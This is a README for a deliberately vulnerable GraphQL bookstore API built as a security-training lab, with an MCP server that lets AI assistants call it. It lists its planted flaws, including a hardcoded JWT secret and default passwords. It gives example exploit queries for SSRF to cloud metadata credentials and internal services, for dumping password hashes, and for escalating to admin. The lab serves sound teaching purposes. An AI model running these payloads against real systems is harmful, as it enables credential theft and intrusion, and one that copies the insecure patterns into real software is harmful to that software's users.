# GraphQL Bookstore API - Security Learning Environment

A realistic GraphQL API server built in C++ designed for security education and practice, covering all OWASP API Security Top 10 vulnerabilities.

## Features

- **Full Database Integration** - PostgreSQL with real user/book/order management
- **JWT Authentication** - Token-based auth with role-based access control (user, staff, admin)
- **Username-based Login** - Register and login using username/password (no email required)
- **SSRF with Whitelisted URLs** - Real HTTP fetching to allowed endpoints
- **Field-Level Response Control** - Specify exactly which fields you want returned
- **Interactive Playground** - Built-in web UI for testing queries and mutations
- **Complete CRUD Operations** - Users, books, orders, reviews, coupons
- **All OWASP API Security Top 10 vulnerabilities** implemented realistically

## Overview

### MCP Server - AI/LLM Integration

The Bookstore API includes an MCP (Model Context Protocol) server that exposes all API operations as tools for AI and LLM models. This enables AI assistants to interact with the Bookstore API natively.

#### Quick Installation

```bash
# Navigate to MCP directory and install
cd mcp
npm install
```

#### Usage

**Local Development:**
```bash
# Start the Bookstore API server (from project root)
./bookstore-server

# In another terminal, start MCP server
cd mcp
npm start
```

**Production (Live API):**
```bash
cd mcp
API_URL=https://api.graphqlbook.store/graphql npm start
```

#### Available MCP Tools (25 total)

| Category | Tools |
|----------|-------|
| Authentication | `bookstore_login`, `bookstore_register`, `bookstore_me` |
| Books | `bookstore_books`, `bookstore_book`, `bookstore_search` |
| Cart | `bookstore_cart`, `bookstore_add_to_cart`, `bookstore_remove_from_cart` |
| Orders | `bookstore_orders`, `bookstore_create_order`, `bookstore_purchase_cart`, `bookstore_cancel_order` |
| Reviews | `bookstore_create_review`, `bookstore_delete_review`, `bookstore_book_reviews`, `bookstore_my_reviews` |
| Profile | `bookstore_update_profile` |
| Coupons | `bookstore_apply_coupon` |
| Webhooks | `bookstore_register_webhook`, `bookstore_webhooks`, `bookstore_test_webhook` |
| Admin | `bookstore_admin_stats`, `bookstore_admin_orders`, `bookstore_admin_payments` |
| Special | `bookstore_pro_inventory` |

#### Claude Desktop Integration

Add to your Claude Desktop config:

```json
{
  "mcpServers": {
    "bookstore": {
      "command": "node",
      "args": ["/path/to/GraphQL-Bookstore/mcp/mcp_server.mjs"],
      "env": {
        "API_URL": "http://localhost:4000/graphql"
      }
    }
  }
}
```

For production, change `API_URL` to `https://api.graphqlbook.store/graphql`.

See `mcp/README.md` for detailed documentation.

## OWASP API Security Top 10 Coverage

This environment includes realistic implementations of all OWASP API Security Top 10 vulnerabilities:

1. **Broken Object Level Authorization (BOLA)**
   - `_internalUserSearch` - Access all users' data including password hashes
   - `orders` query accessible without proper ownership checks
   - Staff role can access any user's data

2. **Broken User Authentication**
   - Weak/hardcoded JWT secret: `CHANGE_ME_IN_PRODUCTION_real_jwt_secret_key_2024`
   - Tokens have no expiration
   - No token revocation mechanism
   - Mass assignment via `updateProfile` allows privilege escalation

3. **Excessive Data Exposure**
   - `passwordHash` field accessible in all user queries
   - Full user details exposed (phone, address, etc.)
   - No field-level authorization on sensitive data

4. **Lack of Resources & Rate Limiting**
   - No query depth limits
   - No request rate limiting
   - Unlimited pagination possible

5. **Broken Object Property Level Authorization**
   - `updateProfile` mutation accepts any field including `role`
   - Can escalate from user → staff → admin

6. **Mass Assignment**
   - All mutation fields processed without allowlist/denylist
   - Update profile accepts arbitrary properties

7. **Security Misconfiguration**
   - Debug endpoints (`_internal*`) exposed to all users
   - Verbose error messages
   - Introspection enabled (schema information leaked)

8. **Injection**
   - GraphQL query structure manipulation
   - Input validation minimal
   - Potential for injection in database queries

9. **Improper Assets Management**
   - Internal endpoints accessible to all users
   - No API versioning
   - Deprecated endpoints still functional

10. **Insufficient Logging & Monitoring**
    - No audit logging
    - Failed authentication not tracked
    - No anomaly detection

**Bonus Vulnerabilities:**

- **Server-Side Request Forgery (SSRF)** - `_fetchExternalResource` makes real HTTP requests to whitelisted URLs including localhost, 169.254.169.254 (cloud metadata)
- **Business Logic Flaws** - Coupon abuse, refund bypass, inventory manipulation

## Quick Start

### Option 1: Direct Build (Requires PostgreSQL)

```bash
# Install dependencies
sudo apt-get install build-essential libpq-dev libssl-dev libjwt-dev libcurl4-openssl-dev

# Build server
./build.sh

# Initialize database (requires sudo/postgres access)
sudo -u postgres psql -f scripts/init_database.sql

# Run server
./bookstore-server
```

### Option 2: Docker (Recommended)

```bash
# Build and run with docker-compose
docker-compose up -d

# Server will be available at http://localhost:4000
# Database runs automatically in container
```

### GitHub Actions & Docker Hub

This repository includes automated Docker image building and pushing to Docker Hub via GitHub Actions.

**Workflow triggers:**
- Push to `main` or `master` branches
- New version tags (e.g., `v1.0.0`)

**Required secrets (configure in repository Settings → Secrets and variables → Actions):**
- `DOCKER_USERNAME` - Your Docker Hub username
- `DOCKER_PASSWORD` - Docker Hub password or access token

**Docker Hub repository:**
- Image: `DOCKER_USERNAME/graphql` (e.g., `johndoe/graphql`)
- Tags: `latest`, branch names, version tags

**Manual build and push:**
```bash
# Build locally
docker build -t graphql:latest .

# Login to Docker Hub
docker login

# Tag with your username
docker tag graphql:latest $DOCKER_USERNAME/graphql:latest

# Push to Docker Hub
docker push $DOCKER_USERNAME/graphql:latest
```

Access GraphQL Playground at: http://localhost:4000/

## Default Users

All users have password: **password123**

| Username | Role | Description |
|----------|-------|-------------|
| admin    | admin | Full system access |
| staff    | staff | Can manage users and orders |
| user     | user  | Regular customer access |

### Registration

New users can register via the GraphQL mutation:

```graphql
mutation {
  register(username: "newuser", firstName: "John", lastName: "Doe", password: "mypassword") {
    success
    message
    token
    user {
      id
      username
      role
    }
  }
}
```
| User | user@bookstore.com | user123 |

## Security Focus

This environment contains intentional vulnerabilities designed to be realistic and challenging:

### High-Impact Vulnerabilities:

1. **Server-Side Request Forgery (SSRF)** - Critical
   - `_fetchExternalResource` - Arbitrary URL fetching
   - `_validateWebhookUrl` - Webhook validation SSRF
   - `_importUsers` - Import from external URLs
   - `_fetchBookMetadata` - Metadata fetching SSRF
   - Cloud metadata access via internal IPs
   - Internal network scanning capabilities

2. **Broken Object-Level Authorization (BOLA)** - Critical
   - Staff can access any user's data
   - Orders accessible by ID without ownership check
   - Internal endpoints expose all user data

3. **Broken User Authentication** - Critical
   - Weak/hardcoded JWT secrets
   - No token revocation
   - Mass assignment allows privilege escalation
   - Indefinite token expiration

4. **Injection** - Critical
   - GraphQL injection in debug queries
   - Potential SQLi through unsanitized inputs
   - Insufficient input validation

### Medium-Impact Vulnerabilities:

5. **Excessive Data Exposure**
   - Password hashes in search results
   - Payment details exposed via nested queries
   - Bulk user data export
   - Internal statistics accessible

6. **Lack of Resources & Rate Limiting**
   - No query depth limits
   - Unlimited pagination
   - Alias abuse
   - DoS via complex queries

7. **Security Misconfiguration**
   - Debug query exposes SQL
   - Introspection enabled
   - Verbose error messages
   - Deprecated endpoints accessible

8. **Business Logic Flaws**
   - Coupon no per-user limits
   - Refund bypasses validation
   - Inventory race conditions
   - Address manipulation

### Low-Impact Vulnerabilities:

9. **Improper Assets Management**
   - Internal endpoints exposed
   - No API versioning
   - Deprecated mutations still work

10. **Insufficient Logging & Monitoring**
    - No audit logging
    - Failed auth not tracked
    - No anomaly detection

## Realism Factors

- **No "IsAdmin" flags** - Vulnerabilities require understanding the system
- **Subtle implementation errors** - Look like honest mistakes, not backdoors
- **Inconsistent authorization** - Some checks exist, others are missing
- **GraphQL-specific** - Exploits use GraphQL features (introspection, aliases, nesting)
- **Multi-step exploits** - Most require chaining vulnerabilities
- **Production patterns** - Reflect common real-world deployment mistakes

## Learning Objectives

This API is designed to teach:

1. GraphQL-specific vulnerability exploitation
2. Real JWT token manipulation and validation
3. SSRF exploitation with actual HTTP requests
4. Database-driven API security
5. Authorization bypass patterns (BOLA)
6. Mass assignment and privilege escalation
7. Cloud service interaction via SSRF
8. API security assessment with field-level control

## Testing the Vulnerabilities

### Testing SSRF (Real HTTP Requests)

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { _fetchExternalResource(url: \"http://example.com\") }"
  }'
```

### Testing User Registration

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { register(username: \"testuser\", firstName: \"Test\", lastName: \"User\", password: \"testpass123\") { success message token user { id username role } }"
  }'
```

### Testing Login

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { login(username: \"admin\", password: \"password123\") { success message token user { id username role } }"
  }'
```

### Testing BOLA (No Auth Required)

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { _internalUserSearch(username: \"\") { id username passwordHash role } }"
  }'
```

## Project Structure

```
.
├── src/main.cpp              # Main server implementation (900+ lines)
├── scripts/init_database.sql  # Database schema and seed data
├── build.sh                  # Build script
├── docker-compose.yml        # Docker deployment (PostgreSQL + API)
├── Dockerfile                # Docker image for API
├── README.md                 # This file
├── QUICKSTART.md            # Quick start and exploit examples
├── VULNERABILITIES.md       # Detailed vulnerability documentation
├── DATABASE_SETUP.md        # Database setup instructions
└── include/                # Header files (for modular components)
```

## Realism Factors

This implementation prioritizes realism over simplicity:

- **Real PostgreSQL Database** - Not mock data, actual SQL queries
- **Real JWT Implementation** - Using libjwt, not string concatenation
- **Real HTTP Requests** - libcurl makes actual network calls for SSRF
- **Full CRUD Operations** - Create, Read, Update, Delete for all entities
- **Field-Level Control** - GraphQL fields actually parsed and returned selectively
- **Multiple User Roles** - Admin, staff, user with different permissions

## Running Tests

A comprehensive test suite is included:

```bash
# Start the server first
./bookstore-server

# In another terminal, run tests
./test_api.sh
```

The test suite will:
1. Check server health
2. Test user registration
3. Test login with username/password
4. Test books query
5. Test SSRF functionality
6. Test BOLA vulnerability (user enumeration)
7. Test mass assignment (privilege escalation)

## Current Implementation Status

✅ **Fully Implemented:**
- PostgreSQL database integration
- JWT authentication and validation
- Username/password authentication
- User registration
- SSRF with real HTTP requests and URL whitelisting
- Book CRUD operations
- User CRUD operations
- BOLA vulnerability (user enumeration)
- Mass assignment (role escalation)
- Excessive data exposure (password hashes)
- Interactive GraphQL playground
- Docker deployment

⚠️ **Partially Implemented (Working but simplified):**
- Orders (basic structure, no payment processing)
- Shopping cart (database schema, no active logic)
- Reviews (database schema, no active logic)
- Coupons (database schema, no active logic)

## Deployment

### Production Readiness

**This is a DELIBERATELY VULNERABLE API. DO NOT USE IN PRODUCTION.**

To make this production-ready, you would need to:

1. Fix all OWASP API Security Top 10 vulnerabilities
2. Add rate limiting and query depth restrictions
3. Implement proper password hashing with bcrypt
4. Add input validation and sanitization
5. Remove debug endpoints and disable introspection
6. Add comprehensive logging and monitoring
7. Implement proper authorization checks on all endpoints
8. Use strong, rotated JWT secrets with expiration
9. Add HTTPS/TLS support
10. Implement request size limits

## Contributing

While this code is intentionally vulnerable, the patterns and structure can be adapted for production use with proper security measures.

## License

Educational use only.

## Documentation

- `QUICKSTART.md` - Installation and example exploits
- `VULNERABILITIES.md` - Detailed vulnerability descriptions
- `config/settings.json` - Server configuration

## Example Exploits

### 1. SSRF - Cloud Metadata Access (Critical)

```graphql
query {
  _fetchExternalResource(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
}
```

**Impact:** Access cloud instance credentials to compromise the cloud environment.

### 2. SSRF - Internal Service Discovery

```graphql
query {
  _fetchExternalResource(url: "http://localhost:6379/")
}
```

**Impact:** Detect internal services (Redis, databases, admin panels).

### 3. BOLA - User Enumeration with Password Hashes

```graphql
query {
  _internalUserSearch(username: "") {
    id
    username
    role
    passwordHash
    phone
    address
  }
}
```

**Impact:** Dump all users with their password hashes.

### 4. Mass Assignment - Privilege Escalation

```graphql
mutation {
  updateProfile(username: "currentuser", role: "admin") {
    id
    username
    role
  }
}
```

**Impact:** Elevate privileges to admin and take over system.

### 5. Excessive Data Exposure - Password Hashes

```graphql
query {
  me {
    id
    username
    passwordHash    # Should not be exposed!
  }
}
```

**Impact:** Password hash leakage (useful for offline cracking).

### 6. No Auth Required - Internal Endpoints

```graphql
query {
  _internalUserSearch(username: "admin") {
    passwordHash
  }
}
```

**Impact:** Access admin data without authentication.

## Difficulty Levels

- **Low**: Discoverable via introspection, single query exploitation
- **Medium**: Requires combining multiple operations, understanding authorization
- **High**: Requires timing, race conditions, deep GraphQL/cloud knowledge

**DO NOT USE IN PRODUCTION**

## Contributing

This is a learning environment. While the code is intentionally vulnerable, the structure and patterns can be adapted for production use with proper security measures.

## License

Educational use only. See LICENSE file for details.